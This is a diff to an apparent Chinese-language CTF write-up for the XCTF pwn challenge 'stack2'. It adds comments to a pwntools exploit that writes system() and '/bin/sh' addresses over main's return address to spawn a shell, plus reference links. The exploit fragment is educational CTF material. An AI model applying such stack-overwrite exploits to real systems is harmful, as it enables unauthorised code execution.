@@ -530,7 +530,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   return 0;
 }
 ```
-
+0x84偏移可以直接在ida看。或者看xctf_pwn_stack2.pdf 动态调试。
 exp: 
 ```python
 #coding:utf8
@@ -585,14 +585,15 @@ p.sendlineafter('Give me your numbers', '1')
 for i in range(4):
   change_number(write_offset+i, system_addr[i])
  
-write_offset += 8
+write_offset += 8 # system4位 system返回值4位-跳过了这里 system参数 ,  +8直接到参数这里了
 for i in range(4):
   change_number(write_offset+i, sh_addr[i])
  
  
-p.sendlineafter('5. exit', '5')
+p.sendlineafter('5. exit', '5') # 修改的是main的 retn，所以要先退出。
  
  
 p.interactive()
 ```
 https://bbs.secgeeker.net/thread-1430-1-1.html
+https://blog.csdn.net/fastergohome/article/details/103669719
